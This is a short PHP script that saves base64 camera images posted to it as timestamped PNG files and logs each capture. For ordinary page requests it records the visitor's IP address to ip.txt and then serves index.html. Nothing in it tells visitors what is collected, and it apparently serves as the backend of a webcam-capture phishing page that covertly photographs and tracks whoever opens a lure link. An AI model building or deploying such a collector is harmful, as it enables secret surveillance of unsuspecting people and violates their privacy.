<?php
// Enable error reporting for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    if (isset($data['image'])) {
        $image = $data['image'];
        $image = str_replace('data:image/png;base64,', '', $image);
        $image = str_replace(' ', '+', $image);
        $decoded = base64_decode($image);
        if ($decoded === false) {
            die("Error: Base64 decode failed");
        }
        $filename = "cam_" . time() . ".png";
        if (!file_put_contents($filename, $decoded)) {
            die("Error: Failed to save image");
        }
        if (!file_put_contents("Log.log", "Cam captured at " . date('Y-m-d H:i:s') . "\n")) {
            die("Error: Failed to write Log.log");
        }
        exit;
    } else {
        die("Error: No image data in POST");
    }
}

// Capture IP
$ip = $_SERVER['REMOTE_ADDR'];
if (!file_put_contents("ip.txt", "IP: $ip\n")) {
    die("Error: Failed to write ip.txt");
}

// Serve HTML
if (!file_exists('index.html')) {
    die("Error: index.html not found");
}
header('Content-Type: text/html');
readfile('index.html');
exit;
